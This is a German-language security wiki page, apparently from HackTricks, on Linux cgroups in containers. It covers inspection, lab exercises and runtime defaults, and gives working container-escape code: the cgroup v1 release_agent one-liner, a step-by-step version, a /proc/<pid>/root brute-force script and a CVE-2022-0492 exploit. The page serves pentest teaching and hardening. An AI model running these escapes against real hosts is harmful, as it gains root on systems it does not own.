# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

Linux **control groups** sind der Kernel‑Mechanismus, mit dem Prozesse für Abrechnung, Begrenzung, Priorisierung und Richtliniendurchsetzung gruppiert werden. Wenn namespaces vor allem die Sicht auf Ressourcen isolieren, dann geht es bei cgroups hauptsächlich darum zu steuern, **wie viel** dieser Ressourcen eine Prozessgruppe verbrauchen darf und in manchen Fällen **welche Klassen von Ressourcen** sie überhaupt nutzen dürfen. Containers verlassen sich ständig auf cgroups, selbst wenn der Benutzer sie nie direkt betrachtet, weil fast jede moderne runtime dem Kernel mitteilen muss: "diese Prozesse gehören zu diesem workload, und dies sind die Ressourcenvorgaben, die für sie gelten".

Deshalb legen container engines einen neuen container in einen eigenen cgroup‑Subbaum. Sobald die Prozesshierarchie dort liegt, kann die runtime den Speicher begrenzen, die Anzahl der PIDs limitieren, die CPU‑Nutzung gewichten, I/O regulieren und den Gerätezugriff einschränken. In einer Produktionsumgebung ist das sowohl für Multi‑Tenant‑Sicherheit als auch für einfache betriebliche Hygiene unerlässlich. Ein container ohne sinnvolle Ressourcenbeschränkungen kann den Speicher erschöpfen, das System mit Prozessen fluten oder CPU und I/O so monopolieren, dass der Host oder benachbarte workloads instabil werden.

Aus Sicht der Sicherheit sind cgroups in zwei Punkten wichtig. Erstens erlauben fehlerhafte oder fehlende Ressourcenlimits einfache denial-of-service attacks. Zweitens haben einige cgroup‑Funktionen, insbesondere in älteren **cgroup v1**‑Setups, historisch kraftvolle Breakout‑Primitiven geschaffen, wenn sie von innerhalb eines containers beschreibbar waren.

## v1 Vs v2

Es gibt zwei verbreitete cgroup‑Modelle. **cgroup v1** stellt mehrere Controller‑Hierarchien bereit, und ältere Exploit‑Beschreibungen drehen sich oft um die dort vorhandenen eigenartigen und teils übermächtigen Semantiken. **cgroup v2** führt eine einheitlichere Hierarchie und insgesamt saubereres Verhalten ein. Moderne Distributionen bevorzugen zunehmend cgroup v2, aber gemischte oder Legacy‑Umgebungen existieren weiterhin, weshalb beide Modelle beim Prüfen realer Systeme relevant bleiben.

Der Unterschied ist wichtig, weil einige der bekanntesten container‑breakout‑Geschichten, wie etwa Missbrauch des **`release_agent`** in cgroup v1, sehr spezifisch an älteres cgroup‑Verhalten gebunden sind. Ein Leser, der einen cgroup‑Exploit in einem Blog sieht und ihn dann blind auf ein modernes, ausschließlich cgroup v2 nutzendes System anwendet, wird wahrscheinlich missverstehen, was auf dem Ziel tatsächlich möglich ist.

## Inspektion

Die schnellste Möglichkeit, zu sehen, wo sich Ihre aktuelle Shell befindet, ist:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Die Datei `/proc/self/cgroup` zeigt die cgroup-Pfade, die mit dem aktuellen Prozess verknüpft sind. Auf einem modernen cgroup v2 Host sieht man häufig einen einheitlichen Eintrag. Auf älteren oder hybriden Hosts kann man mehrere v1-Controller-Pfade sehen. Sobald Sie den Pfad kennen, können Sie die entsprechenden Dateien unter `/sys/fs/cgroup` untersuchen, um Limits und die aktuelle Nutzung zu sehen.

Auf einem cgroup v2 Host sind die folgenden Befehle nützlich:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Diese Dateien zeigen, welche Controller existieren und welche an untergeordnete cgroups delegiert werden. Dieses Delegationsmodell ist in rootless- und systemd-managed-Umgebungen relevant, da die runtime möglicherweise nur den Teil der cgroup-Funktionalität steuern kann, den die übergeordnete Hierarchie tatsächlich delegiert.

## Labor

Eine Möglichkeit, cgroups in der Praxis zu beobachten, besteht darin, einen speicherbegrenzten Container auszuführen:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Sie können auch einen PID-beschränkten Container ausprobieren:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Diese Beispiele sind nützlich, weil sie helfen, das runtime flag mit der Kernel-Dateischnittstelle zu verbinden. Die runtime erzwingt die Regel nicht per Magie; sie schreibt die relevanten cgroup-Einstellungen und überlässt es dann dem Kernel, diese gegenüber dem Prozessbaum durchzusetzen.

## Verwendung der Runtime

Docker, Podman, containerd und CRI-O verlassen sich im normalen Betrieb alle auf cgroups. Die Unterschiede betreffen dabei meist nicht, ob cgroups verwendet werden, sondern **welche Standardeinstellungen sie wählen**, **wie sie mit systemd interagieren**, **wie rootless delegation funktioniert**, und **wie viel der Konfiguration auf Engine-Ebene gegenüber der Orchestrierungsebene kontrolliert wird**.

In Kubernetes werden resource requests und limits letztendlich zur cgroup-Konfiguration auf dem Node. Der Weg vom Pod YAML zur Kernel-Durchsetzung führt über den kubelet, den CRI runtime und den OCI runtime, aber cgroups sind weiterhin der Kernel-Mechanismus, der die Regel schließlich anwendet. In Incus/LXC-Umgebungen werden cgroups ebenfalls stark genutzt, insbesondere weil system containers oft einen reicheren Prozessbaum und eher VM-ähnliche Betriebserwartungen offenlegen.

## Fehlkonfigurationen und Ausbrüche

Die klassische cgroup-Sicherheitsgeschichte ist der beschreibbare **cgroup v1 `release_agent`**-Mechanismus. In diesem Modell kann der Kernel, wenn ein Angreifer die richtigen cgroup-Dateien beschreiben, `notify_on_release` aktivieren und den in `release_agent` gespeicherten Pfad kontrollieren kann, beim Leeren der cgroup einen vom Angreifer gewählten Pfad in den initial namespaces auf dem Host ausführen. Deshalb richten ältere Writeups so viel Aufmerksamkeit auf die Schreibbarkeit von cgroup-Controllern, Mount-Optionen und Namespace-/Capability-Bedingungen.

Selbst wenn `release_agent` nicht verfügbar ist, sind cgroup-Fehler weiterhin relevant. Zu weit gefasster Gerätezugriff kann Host-Geräte vom Container aus erreichbar machen. Fehlende Speicher- und PID-Limits können eine einfache Codeausführung in einen Host-DoS verwandeln. Schwache cgroup-Delegation in rootless-Szenarien kann Verteidiger zudem in die Irre führen, indem sie annehmen, eine Einschränkung bestehe, obwohl die runtime diese niemals tatsächlich anwenden konnte.

### Hintergrund zu `release_agent`

Die `release_agent`-Technik gilt nur für **cgroup v1**. Die Grundidee ist, dass, wenn der letzte Prozess in einer cgroup endet und `notify_on_release=1` gesetzt ist, der Kernel das Programm ausführt, dessen Pfad in `release_agent` gespeichert ist. Diese Ausführung findet in den **initial namespaces auf dem Host** statt, was ein beschreibbares `release_agent` zu einer Container-Escape-Primitive macht.

Damit die Technik funktioniert, benötigt der Angreifer in der Regel:

- eine beschreibbare **cgroup v1**-Hierarchie
- die Möglichkeit, eine untergeordnete cgroup zu erstellen oder zu verwenden
- die Möglichkeit, `notify_on_release` zu setzen
- die Möglichkeit, einen Pfad in `release_agent` zu schreiben
- einen Pfad, der aus Sicht des Hosts auf ein ausführbares Programm verweist

### Klassischer PoC

Der historische One-Liner-PoC ist:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Dieses PoC schreibt einen payload-Pfad in `release_agent`, löst die cgroup release aus und liest dann die auf dem Host erzeugte Ausgabedatei wieder aus.

### Lesbare Schritt-für-Schritt-Anleitung

Dasselbe Konzept ist leichter zu verstehen, wenn es in Schritte unterteilt wird.

1. Erstelle und bereite eine beschreibbare cgroup vor:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Ermitteln Sie den Host-Pfad, der dem Container-Dateisystem entspricht:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Lege eine payload ab, die vom Host-Pfad aus sichtbar ist:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ausführung auslösen, indem die cgroup geleert wird:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Die Auswirkung ist die Ausführung des payloads auf dem host mit host root privileges. In einem echten exploit schreibt das payload normalerweise eine proof file, startet eine reverse shell oder verändert den host state.

### Relative-Pfad-Variante mithilfe von `/proc/<pid>/root`

In manchen Umgebungen ist der host path zum container filesystem nicht offensichtlich oder wird vom storage driver verborgen. In diesem Fall kann der payload path über `/proc/<pid>/root/...` angegeben werden, wobei `<pid>` eine host PID ist, die zu einem Prozess im aktuellen container gehört. Das ist die Grundlage der relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Der relevante Trick hier ist nicht brute force an sich, sondern die Pfadform: `/proc/<pid>/root/...` lässt den kernel eine Datei innerhalb des container filesystem vom host namespace aus auflösen, selbst wenn der direkte host storage path nicht im Voraus bekannt ist.

### CVE-2022-0492 Variante

Im Jahr 2022 zeigte CVE-2022-0492, dass das Schreiben in `release_agent` in cgroup v1 nicht korrekt auf `CAP_SYS_ADMIN` in der **anfänglichen** user namespace überprüft wurde. Dadurch wurde die Technik auf verwundbaren kernels deutlich leichter erreichbar, weil ein container-Prozess, der eine cgroup hierarchy mounten konnte, `release_agent` schreiben konnte, ohne bereits privilegiert in der host user namespace zu sein.

Minimales exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Auf einem verwundbaren Kernel führt der Host `/proc/self/exe` mit Root-Rechten aus.

Für den praktischen Missbrauch solltest du zunächst prüfen, ob die Umgebung noch beschreibbare cgroup-v1-Pfade oder gefährlichen Gerätezugriff offenlegt:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Wenn `release_agent` vorhanden und schreibbar ist, befinden Sie sich bereits im legacy-breakout territory:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Wenn der cgroup-Pfad selbst keinen escape ergibt, ist die nächste praktische Nutzung häufig denial of service oder reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Diese Befehle zeigen schnell, ob die Workload Platz hat, eine fork-bomb auszuführen, Speicher aggressiv zu verbrauchen oder eine beschreibbare legacy cgroup-Schnittstelle auszunutzen.

## Checks

Bei der Überprüfung eines Ziels dienen die cgroup-Checks dazu, herauszufinden, welches cgroup-Modell verwendet wird, ob der Container beschreibbare Controller-Pfade sieht und ob alte breakout primitives wie `release_agent` überhaupt relevant sind.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Was hier interessant ist:

- If `mount | grep cgroup` shows **cgroup v1**, ältere Breakout-Writeups werden relevanter.
- If `release_agent` exists and is reachable, das ist sofort eine Untersuchung wert.
- If die sichtbare cgroup-Hierarchie beschreibbar ist und der Container außerdem starke capabilities hat, verdient die Umgebung eine deutlich genauere Prüfung.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, diese Kombination verdient sorgfältige Aufmerksamkeit. cgroups werden oft als langweiliges Ressourcen-Management-Thema behandelt, aber historisch waren sie Teil einiger der lehrreichsten container escape chains, gerade weil die Grenze zwischen "resource control" und "host influence" nicht immer so sauber war, wie man annahm.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, gelockerter Gerätezugriff, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits, privilegierter Gerätezugriff, Fehlkonfiguration des hostseitigen Runtimes |
| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direkte Runtime-Konfigurationen, die Geräte-Kontrollen lockern oder legacy beschreibbare cgroup v1-Schnittstellen exponieren |

Die wichtige Unterscheidung ist, dass die **Existenz von cgroup** normalerweise Standard ist, während **nützliche Ressourcenkontrollen** oft optional sind, sofern sie nicht ausdrücklich konfiguriert wurden.
{{#include ../../../../banners/hacktricks-training.md}}
